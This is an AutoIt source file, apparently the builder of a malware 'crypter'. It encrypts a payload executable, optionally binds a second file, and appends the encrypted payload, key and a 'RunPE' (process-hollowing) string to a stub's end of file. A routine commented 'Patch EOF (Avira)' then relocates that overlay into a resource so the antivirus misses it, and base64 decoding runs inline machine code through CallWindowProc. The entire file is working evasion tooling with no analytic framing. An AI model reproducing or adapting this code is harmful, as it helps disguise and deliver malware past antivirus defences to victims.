#NoTrayIcon
#include <winapi.au3>
#include <Array.au3>
#include <WindowsConstants.au3>
#include <Crypt.au3>
#include <Constants.au3>

Global $ARRAY_MODULE_STRUCTURE[1][1][1]
Global $global_types_count
Global $iPopulateArray
Global $global_langs_count
Global $lang_count
Global $global_names_count
Global $name_count
Global Const $RT_CURSOR = 1
Global Const $RT_BITMAP = 2
Global Const $RT_ICON = 3
Global Const $RT_MENU = 4
Global Const $RT_DIALOG = 5
Global Const $RT_STRING = 6
Global Const $RT_FONTDIR = 7
Global Const $RT_FONT = 8
Global Const $RT_ACCELERATOR = 9
Global Const $RT_RCDATA = 10
Global Const $RT_MESSAGETABLE = 11
Global Const $RT_GROUP_CURSOR = 12
Global Const $RT_GROUP_ICON = 14
Global Const $RT_VERSION = 16
Global Const $RT_DLGINCLUDE = 17
Global Const $RT_PLUGPLAY = 19
Global Const $RT_VXD = 20
Global Const $RT_ANICURSOR = 21
Global Const $RT_ANIICON = 22
Global Const $RT_HTML = 23
Global Const $RT_MANIFEST = 24

_Config()

Func _Config()
	Local $r = "NoDataFoundHere"
	$File = FileOpen(__HexToString(_Base64Decode($CmdLine[1])), 0)
	$FullData = FileRead($File)
	FileClose($File)
	$DecryptedData = __HexToString(_Base64Decode($FullData))
	$Data = StringSplit($DecryptedData, "**", 1)
	__StartCrypt($Data[1], $Data[2], $Data[3], $Data[4])
	$RunPEEncrypted = _Crypt_EncryptData($Data[14], $Data[3], $CALG_DES)
	If $Data[11] = "True" Then
		__StartCrypt($Data[12], $Data[2], $Data[3], @ScriptDir & "\BindData.data")
		$a1 = FileOpen(@ScriptDir & "\BindData.data", 0)
		$r = FileRead($a1)
		FileClose($a1)
	Else
	EndIf
	;//Read output Data
	$F1 = FileOpen($Data[4], 0)
	$FullCrypted = FileRead($F1)
	FileClose($F1)
	;//Write Data To EOF
	$F2 = FileOpen($Data[5], 1)
	FileWrite($F2, "////\\\\" & $FullCrypted & "////\\\\" & $Data[3] & "////\\\\" & $Data[6] & "////\\\\" & $Data[7] & "////\\\\" & $Data[8] & "////\\\\" & $Data[2] & "////\\\\" & $Data[9] & "////\\\\" & $Data[10] & "////\\\\" & $Data[11] & "////\\\\" & $r & "////\\\\" & $Data[13] & "////\\\\" & $RunPEEncrypted & "////\\\\" & $Data[15] & "////\\\\" & $Data[16] & "////\\\\" & $Data[17] & "////\\\\")
	FileClose($F2)
	;//Patch EOF (Avira)
	__PatchEOF($Data[5])
EndFunc

Func __PatchEOF($sModule)
    Local $iLoaded
    Local $a_hCall = DllCall("kernel32.dll", "hwnd", "GetModuleHandleW", "wstr", $sModule)
    If @error Then
        Return SetError(1, 0, "")
    EndIf
    Local $pPointer = $a_hCall[0]

    If Not $a_hCall[0] Then
        $a_hCall = DllCall("kernel32.dll", "hwnd", "LoadLibraryExW", "wstr", $sModule, "hwnd", 0, "int", 1)
        If @error Or Not $a_hCall[0] Then
            Return SetError(2, 0, "")
        EndIf
        $iLoaded = 1
        $pPointer = $a_hCall[0]
    EndIf


    Local $hModule = $a_hCall[0]
    Local $tIMAGE_DOS_HEADER = DllStructCreate("char Magic[2];" & _
            "ushort BytesOnLastPage;" & _
            "ushort Pages;" & _
            "ushort Relocations;" & _
            "ushort SizeofHeader;" & _
            "ushort MinimumExtra;" & _
            "ushort MaximumExtra;" & _
            "ushort SS;" & _
            "ushort SP;" & _
            "ushort Checksum;" & _
            "ushort IP;" & _
            "ushort CS;" & _
            "ushort Relocation;" & _
            "ushort Overlay;" & _
            "char Reserved[8];" & _
            "ushort OEMIdentifier;" & _
            "ushort OEMInformation;" & _
            "char Reserved2[20];" & _
            "dword AddressOfNewExeHeader", _
            $pPointer)
    $pPointer += DllStructGetData($tIMAGE_DOS_HEADER, "AddressOfNewExeHeader")
    Local $tIMAGE_NT_SIGNATURE = DllStructCreate("dword Signature", $pPointer)
    If Not (DllStructGetData($tIMAGE_NT_SIGNATURE, "Signature") = 17744) Then
        If $iLoaded Then
            DllCall("kernel32.dll", "int", "FreeLibrary", "hwnd", $hModule)
        EndIf
        Return SetError(3, 0, "")
    EndIf
    $pPointer += 4
    Local $tIMAGE_FILE_HEADER = DllStructCreate("ushort Machine;" & _
            "ushort NumberOfSections;" & _
            "dword TimeDateStamp;" & _
            "dword PointerToSymbolTable;" & _
            "dword NumberOfSymbols;" & _
            "ushort SizeOfOptionalHeader;" & _
            "ushort Characteristics", _
            $pPointer)

    Local $iNumberOfSections = DllStructGetData($tIMAGE_FILE_HEADER, "NumberOfSections")
    $pPointer += 20
    $pPointer += 96
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 8
    $pPointer += 40
    Local $tIMAGE_SECTION_HEADER
    For $i = 1 To $iNumberOfSections
        $tIMAGE_SECTION_HEADER = DllStructCreate("char Name[8];" & _
                "dword UnionOfData;" & _
                "dword VirtualAddress;" & _
                "dword SizeOfRawData;" & _
                "dword PointerToRawData;" & _
                "dword PointerToRelocations;" & _
                "dword PointerToLinenumbers;" & _
                "ushort NumberOfRelocations;" & _
                "ushort NumberOfLinenumbers;" & _
                "dword Characteristics", _
                $pPointer)
        If $i = $iNumberOfSections Then
            Local $array[2]
            $array[0] = Hex(DllStructGetData($tIMAGE_SECTION_HEADER, "PointerToRawData"))
            $array[1] = DllStructGetData($tIMAGE_SECTION_HEADER, "SizeOfRawData")
            Local $FilePath = $sModule
            Local $Offset = Dec($array[0]) + $array[1]
            Local $Length = FileGetSize($sModule) - $Offset

            Local $Buffer, $ptr, $fLen, $hFile, $Result, $Read, $err, $Pos

            If Not FileExists($FilePath) Then Return SetError(1, @error, 0)
            $fLen = FileGetSize($FilePath)
            If $Offset > $fLen Then Return SetError(2, @error, 0)
            If $fLen < $Offset + $Length Then Return SetError(3, @error, 0)

            $Buffer = DllStructCreate("byte[" & $Length & "]")
            $ptr = DllStructGetPtr($Buffer)

            $hFile = _WinAPI_CreateFile($FilePath, 2, 2, 0)
            If $hFile = 0 Then Return SetError(5, @error, 0)

            $Pos = $Offset
            $Result = _WinAPI_SetFilePointer($hFile, $Pos)
            $err = @error
            If $Result = 0xFFFFFFFF Then
                _WinAPI_CloseHandle($hFile)
                Return SetError(6, $err, 0)
            EndIf

            $Read = 0
            $Result = _WinAPI_ReadFile($hFile, $ptr, $Length, $Read)
            $err = @error
            If Not $Result Then
                _WinAPI_CloseHandle($hFile)
                Return SetError(7, $err, 0)
            EndIf

            _WinAPI_CloseHandle($hFile)
            If Not $Result Then Return SetError(8, @error, 0)

            $Result = DllStructGetData($Buffer, 1)
            DllCall("kernel32.dll", "int", "FreeLibrary", "hwnd", $hModule)

            If Not StringIsDigit($Result) Then
                $Tempname = @TempDir & "\SCRIPT_DATUM.bin"
                $Num = 0
                If FileExists($Tempname) Then
                    While FileExists($Tempname)
                        $Tempname = @TempDir & "\SCRIPT_DATUM(" & $Num & ").bin"
                        $Num += 1
                    WEnd
                EndIf
                $Htmp = FileOpen($Tempname, 2)
                FileWrite($Htmp, $Result)
                FileClose($Htmp)
                _ResUpdate($sModule, 10, "SCRIPT_DATUM", 0, $Tempname)
            EndIf
        EndIf

        $pPointer += 40

    Next

EndFunc

Func _ResUpdate($sModule, $iResType, $iResName, $iResLang, $sResFile, $lParam = 0)

    If Not FileExists($sModule) Then
        Return SetError(100, 0, "") ; what happened???
    EndIf

    Local $hFile = FileOpen($sModule, 1)
    If $hFile = -1 Then
        Return SetError(101, 0, "") ; cannot obtain writing rights
    EndIf

    FileClose($hFile)

    Switch $iResType

        Case $RT_GROUP_CURSOR

            Local $tBinary = DllStructCreate("byte[" & FileGetSize($sResFile) & "]")
            Local $hResFile = FileOpen($sResFile, 16)
            DllStructSetData($tBinary, 1, FileRead($hResFile))
            FileClose($hResFile)

            If @error Then
                Return SetError(5, 0, "")
            EndIf

            Local $tResource = DllStructCreate("align 2;ushort;" & _
                    "ushort Type;" & _
                    "ushort ImageCount;" & _
                    "ubyte Width;" & _
                    "ubyte Height;" & _
                    "ubyte ColorCount;" & _
                    "byte;" & _
                    "ushort Xhotspot;" & _
                    "ushort Yhotspot;" & _
                    "dword BitmapSize;" & _
                    "dword BitmapOffset;" & _
                    "byte Body[" & DllStructGetSize($tBinary) - 22 & "]", _
                    DllStructGetPtr($tBinary))

            Local $tBitmap = DllStructCreate("dword HeaderSize", DllStructGetPtr($tResource, "Body"))

            Local $iHeaderSize = DllStructGetData($tBitmap, "HeaderSize")

            Switch $iHeaderSize
                Case 40
                    $tBitmap = DllStructCreate("dword HeaderSize;" & _
                            "dword Width;" & _
                            "dword Height;" & _
                            "ushort Planes;" & _
                            "ushort BitPerPixel;" & _
                            "dword CompressionMethod;" & _
                            "dword Size;" & _
                            "dword Hresolution;" & _
                            "dword Vresolution;" & _
                            "dword Colors;" & _
                            "dword ImportantColors;", _
                            DllStructGetPtr($tResource, "Body"))
                Case 12
                    $tBitmap = DllStructCreate("dword HeaderSize;" & _
                            "ushort Width;" & _
                            "ushort Height;" & _
                            "ushort Planes;" & _
                            "ushort BitPerPixel;", _
                            DllStructGetPtr($tResource, "Body"))
                Case Else
                    Return SetError(6, 0, "")
            EndSwitch

            Local $tCursorWrite = DllStructCreate("ushort Xhotspot;" & _
                    "ushort Yhotspot;" & _
                    "byte Body[" & DllStructGetSize($tResource) - 22 & "]", _
                    DllStructGetPtr($tResource) + DllStructGetData($tResource, "BitmapOffset") - 4)

            DllStructSetData($tCursorWrite, "Xhotspot", DllStructGetData($tResource, "Xhotspot"))
            DllStructSetData($tCursorWrite, "Yhotspot", DllStructGetData($tResource, "Xhotspot"))

            Local $a_hCall = DllCall("kernel32.dll", "hwnd", "BeginUpdateResourceW", "wstr", $sModule, "int", 0)

            If @error Or Not $a_hCall[0] Then
                Return SetError(7, 0, "")
            EndIf

            Local $iCurName = 1
            For $m = 0 To UBound($ARRAY_MODULE_STRUCTURE, 1) - 1
                If $ARRAY_MODULE_STRUCTURE[$m][0][0] = $RT_CURSOR Then
                    For $n = 1 To UBound($ARRAY_MODULE_STRUCTURE, 2) - 1
                        If $iCurName = $ARRAY_MODULE_STRUCTURE[$m][$n][0] Then
                            $iCurName += 1
                        EndIf
                    Next
                    ExitLoop
                EndIf
            Next

            Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                    "hwnd", $a_hCall[0], _
                    "int", $RT_CURSOR, _
                    "int", $iCurName, _
                    "int", $iResLang, _
                    "ptr", DllStructGetPtr($tCursorWrite), _
                    "dword", DllStructGetSize($tCursorWrite))

            If @error Or Not $a_iCall[0] Then
                DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                Return SetError(8, 0, "")
            EndIf

            Local $tCursorGroupWrite = DllStructCreate("ushort;" & _
                    "ushort Type;" & _
                    "ushort ImageCount;" & _
                    "ushort Width;" & _
                    "ushort Height;" & _
                    "ushort Planes;" & _
                    "ushort BitPerPixel;" & _
                    "ushort;" & _
                    "ushort;" & _
                    "ushort OrdinalName")

            DllStructSetData($tCursorGroupWrite, 1, DllStructGetData($tResource, 1))
            DllStructSetData($tCursorGroupWrite, "Type", DllStructGetData($tResource, "Type"))
            DllStructSetData($tCursorGroupWrite, "ImageCount", DllStructGetData($tResource, "ImageCount"))

            DllStructSetData($tCursorGroupWrite, "Width", DllStructGetData($tBitmap, "Width"))
            DllStructSetData($tCursorGroupWrite, "Height", DllStructGetData($tBitmap, "Height"))

            DllStructSetData($tCursorGroupWrite, "Planes", DllStructGetData($tBitmap, "Planes"))
            DllStructSetData($tCursorGroupWrite, "BitPerPixel", DllStructGetData($tBitmap, "BitPerPixel"))

            DllStructSetData($tCursorGroupWrite, 8, 308)

            DllStructSetData($tCursorGroupWrite, "OrdinalName", $iCurName)

            Switch IsNumber($iResName)
                Case True
                    $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                            "hwnd", $a_hCall[0], _
                            "int", $RT_GROUP_CURSOR, _
                            "int", $iResName, _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tCursorGroupWrite), _
                            "dword", DllStructGetSize($tCursorGroupWrite))
                Case Else
                    $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "int", $RT_GROUP_CURSOR, _
                            "wstr", StringUpper($iResName), _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tCursorGroupWrite), _
                            "dword", DllStructGetSize($tCursorGroupWrite))
            EndSwitch

            If @error Or Not $a_iCall[0] Then
                DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                Return SetError(9, 0, "")
            EndIf

            $a_iCall = DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)

            If @error Or Not $a_iCall[0] Then
                Return SetError(10, 0, "")
            EndIf


        Case $RT_GROUP_ICON

            Local $tBinary = DllStructCreate("byte[" & FileGetSize($sResFile) & "]")
            Local $hResFile = FileOpen($sResFile, 16)
            DllStructSetData($tBinary, 1, FileRead($hResFile))
            FileClose($hResFile)

            Local $tResource = DllStructCreate("ushort;" & _
                    "ushort Type;" & _
                    "ushort ImageCount;" & _
                    "byte Body[" & DllStructGetSize($tBinary) - 6 & "]", _
                    DllStructGetPtr($tBinary))

            Local $iIconCount = DllStructGetData($tResource, "ImageCount")

            If Not $iIconCount Then
                Return SetError(5, 0, "")
            EndIf

            Local $tIconGroupHeader = DllStructCreate("ushort;" & _
                    "ushort Type;" & _
                    "ushort ImageCount;" & _
                    "byte Body[" & $iIconCount * 14 & "]")

            DllStructSetData($tIconGroupHeader, 1, DllStructGetData($tResource, 1))
            DllStructSetData($tIconGroupHeader, "Type", DllStructGetData($tResource, "Type"))
            DllStructSetData($tIconGroupHeader, "ImageCount", DllStructGetData($tResource, "ImageCount"))

            Local $tInputIconHeader
            Local $tGroupIconData

            Local $a_hCall = DllCall("kernel32.dll", "hwnd", "BeginUpdateResourceW", "wstr", $sModule, "int", 0)

            If @error Or Not $a_hCall[0] Then
                Return SetError(6, 0, "")
            EndIf

            Local $iEnumIconName

            For $i = 1 To $iIconCount

                $tInputIconHeader = DllStructCreate("ubyte Width;" & _
                        "ubyte Height;" & _
                        "ubyte Colors;" & _
                        "ubyte;" & _
                        "ushort Planes;" & _
                        "ushort BitPerPixel;" & _
                        "dword BitmapSize;" & _
                        "dword BitmapOffset", _
                        DllStructGetPtr($tResource, "Body") + ($i - 1) * 16)

                $tGroupIconData = DllStructCreate("ubyte Width;" & _
                        "ubyte Height;" & _
                        "ubyte Colors;" & _
                        "ubyte;" & _
                        "ushort Planes;" & _
                        "ushort BitPerPixel;" & _
                        "dword BitmapSize;" & _
                        "ushort OrdinalName;", _
                        DllStructGetPtr($tIconGroupHeader, "Body") + ($i - 1) * 14)

                DllStructSetData($tGroupIconData, "Width", DllStructGetData($tInputIconHeader, "Width"))
                DllStructSetData($tGroupIconData, "Height", DllStructGetData($tInputIconHeader, "Height"))
                DllStructSetData($tGroupIconData, "Colors", DllStructGetData($tInputIconHeader, "Colors"))
                DllStructSetData($tGroupIconData, 4, DllStructGetData($tInputIconHeader, 4))
                DllStructSetData($tGroupIconData, "Planes", DllStructGetData($tInputIconHeader, "Planes"))
                DllStructSetData($tGroupIconData, "BitPerPixel", DllStructGetData($tInputIconHeader, "BitPerPixel"))
                DllStructSetData($tGroupIconData, "BitmapSize", DllStructGetData($tInputIconHeader, "BitmapSize"))

                $iEnumIconName += 1
                For $m = 0 To UBound($ARRAY_MODULE_STRUCTURE, 1) - 1
                    If $ARRAY_MODULE_STRUCTURE[$m][0][0] = $RT_ICON Then
                        For $n = 1 To UBound($ARRAY_MODULE_STRUCTURE, 2) - 1
                            If $iEnumIconName = $ARRAY_MODULE_STRUCTURE[$m][$n][0] Then
                                $iEnumIconName += 1
                            EndIf
                        Next
                        ExitLoop
                    EndIf
                Next

                DllStructSetData($tGroupIconData, "OrdinalName", $iEnumIconName)

                Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                        "hwnd", $a_hCall[0], _
                        "int", $RT_ICON, _
                        "int", $iEnumIconName, _
                        "int", $iResLang, _
                        "ptr", DllStructGetPtr($tResource) + DllStructGetData($tInputIconHeader, "BitmapOffset"), _
                        "dword", DllStructGetData($tInputIconHeader, "BitmapSize"))

                If @error Or Not $a_iCall[0] Then
                    DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                    Return SetError(7, $iEnumIconName, "")
                EndIf

            Next

            Switch IsNumber($iResName)
                Case True
                    $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                            "hwnd", $a_hCall[0], _
                            "int", $RT_GROUP_ICON, _
                            "int", $iResName, _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tIconGroupHeader), _
                            "dword", DllStructGetSize($tIconGroupHeader))
                Case Else
                    $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "int", $RT_GROUP_ICON, _
                            "wstr", StringUpper($iResName), _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tIconGroupHeader), _
                            "dword", DllStructGetSize($tIconGroupHeader))
            EndSwitch

            If @error Or Not $a_iCall[0] Then
                DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                Return SetError(8, 0, "")
            EndIf

            $a_iCall = DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)

            If @error Or Not $a_iCall[0] Then
                Return SetError(9, 0, "")
            EndIf


        Case $RT_RCDATA, $RT_MANIFEST, $RT_ANICURSOR, $RT_ANIICON, $RT_HTML

            Local $tResource = DllStructCreate("byte[" & FileGetSize($sResFile) & "]")
            Local $hResFile = FileOpen($sResFile, 16)
            DllStructSetData($tResource, 1, FileRead($hResFile))
            FileClose($hResFile)

            If @error Then
                Return SetError(5, 0, "")
            EndIf

            Local $a_hCall = DllCall("kernel32.dll", "hwnd", "BeginUpdateResourceW", "wstr", $sModule, "int", 0)

            If @error Or Not $a_hCall[0] Then
                Return SetError(6, 0, "")
            EndIf

            Switch IsNumber($iResName)
                Case True
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                            "hwnd", $a_hCall[0], _
                            "int", $iResType, _
                            "int", $iResName, _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource), _
                            "dword", FileGetSize($sResFile))
                Case Else
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "int", $iResType, _
                            "wstr", StringUpper($iResName), _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource), _
                            "dword", FileGetSize($sResFile))
            EndSwitch

            If @error Or Not $a_iCall[0] Then
                DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                Return SetError(7, 0, "")
            EndIf

            $a_iCall = DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)

            If @error Or Not $a_iCall[0] Then
                Return SetError(8, 0, "")
            EndIf

        Case $RT_BITMAP

            Local $tBinary = DllStructCreate("byte[" & FileGetSize($sResFile) & "]")
            Local $hResFile = FileOpen($sResFile, 16)
            DllStructSetData($tBinary, 1, FileRead($hResFile))
            FileClose($hResFile)

            Local $tResource = DllStructCreate("align 2;char Identifier[2];" & _
                    "dword BitmapSize;" & _
                    "short;" & _
                    "short;" & _
                    "dword BitmapOffset;" & _
                    "byte Body[" & DllStructGetSize($tBinary) - 14 & "]", _
                    DllStructGetPtr($tBinary))

            If Not (DllStructGetData($tResource, 1) == "BM") Then
                Return SetError(5, 0, "")
            EndIf

            Local $a_hCall = DllCall("kernel32.dll", "hwnd", "BeginUpdateResourceW", "wstr", $sModule, "int", 0)

            If @error Or Not $a_hCall[0] Then
                Return SetError(6, 0, "")
            EndIf

            Switch IsNumber($iResName)
                Case True
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                            "hwnd", $a_hCall[0], _
                            "int", $iResType, _
                            "int", $iResName, _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource, "Body"), _
                            "dword", FileGetSize($sResFile) - 14)
                Case Else
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "int", $iResType, _
                            "wstr", StringUpper($iResName), _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource, "Body"), _
                            "dword", FileGetSize($sResFile) - 14)
            EndSwitch

            If @error Or Not $a_iCall[0] Then
                DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                Return SetError(7, 0, "")
            EndIf

            $a_iCall = DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)

            If @error Or Not $a_iCall[0] Then
                Return SetError(8, 0, "")
            EndIf


        Case Else

            Local $tResource = DllStructCreate("byte[" & FileGetSize($sResFile) & "]")
            Local $hResFile = FileOpen($sResFile, 16)
            DllStructSetData($tResource, 1, FileRead($hResFile))
            FileClose($hResFile)

            If @error Then
                Return SetError(5, 0, "")
            EndIf

            Local $a_hCall = DllCall("kernel32.dll", "hwnd", "BeginUpdateResourceW", "wstr", $sModule, "int", 0)

            If @error Or Not $a_hCall[0] Then
                Return SetError(6, 0, "")
            EndIf

            Switch IsNumber($iResType) + 2 * IsNumber($iResName)
                Case 0
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "wstr", StringUpper($iResType), _
                            "wstr", StringUpper($iResName), _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource), _
                            "dword", FileGetSize($sResFile))
                Case 1
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "int", $iResType, _
                            "wstr", StringUpper($iResName), _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource), _
                            "dword", FileGetSize($sResFile))
                Case 2
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResourceW", _
                            "hwnd", $a_hCall[0], _
                            "wstr", StringUpper($iResType), _
                            "int", $iResName, _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource), _
                            "dword", FileGetSize($sResFile))
                Case 3
                    Local $a_iCall = DllCall("kernel32.dll", "int", "UpdateResource", _
                            "hwnd", $a_hCall[0], _
                            "int", $iResType, _
                            "int", $iResName, _
                            "int", $iResLang, _
                            "ptr", DllStructGetPtr($tResource), _
                            "dword", FileGetSize($sResFile))
            EndSwitch

            If @error Or Not $a_iCall[0] Then
                DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)
                Return SetError(7, 0, "")
            EndIf

            $a_iCall = DllCall("kernel32.dll", "int", "EndUpdateResource", "hwnd", $a_hCall[0], "int", 0)

            If @error Or Not $a_iCall[0] Then
                Return SetError(8, 0, "")
            EndIf

    EndSwitch

    Return SetError(0, 0, 1) ; all done

EndFunc



Func __HexToString($sString)
    If StringLeft($sString, 2) <> "0x" Then $sString = "0x" & $sString
    Return BinaryToString($sString)
EndFunc

Func __StartCrypt($FileToCrypt, $EncryptionALG, $Key, $Out)
	_Crypt_Startup()
	Switch $EncryptionALG
	Case 1
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_RC2)
	Case 2
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_RC4)
	Case 3
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_AES_128)
	Case 4
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_AES_192)
	Case 5
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_AES_256)
	Case 6
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_DES)
	Case 7
		_Crypt_EncryptFile($FileToCrypt, $Out, $Key, $CALG_3DES)
	EndSwitch
	_crypt_shutdown()
EndFunc

Func _Base64Decode($Data)
	Local $Opcode = "0xC81000005356578365F800E8500000003EFFFFFF3F3435363738393A3B3C3DFFFFFF00FFFFFF000102030405060708090A0B0C0D0E0F10111213141516171819FFFFFFFFFFFF1A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132338F45F08B7D0C8B5D0831D2E9910000008365FC00837DFC047D548A034384C0750383EA033C3D75094A803B3D75014AB00084C0751A837DFC047D0D8B75FCC64435F400FF45FCEBED6A018F45F8EB1F3C2B72193C7A77150FB6F083EE2B0375F08A068B75FC884435F4FF45FCEBA68D75F4668B06C0E002C0EC0408E08807668B4601C0E004C0EC0208E08847018A4602C0E00624C00A46038847028D7F038D5203837DF8000F8465FFFFFF89D05F5E5BC9C21000"
	
	Local $CodeBuffer = DllStructCreate("byte[" & BinaryLen($Opcode) & "]")
	DllStructSetData($CodeBuffer, 1, $Opcode)

	Local $Ouput = DllStructCreate("byte[" & BinaryLen($Data) & "]")
	Local $Ret = DllCall("user32.dll", "int", "CallWindowProc", "ptr", DllStructGetPtr($CodeBuffer), _
													"str", $Data, _
													"ptr", DllStructGetPtr($Ouput), _
													"int", 0, _
													"int", 0)

	Return BinaryMid(DllStructGetData($Ouput, 1), 1, $Ret[0])
EndFunc



	
		
		
	

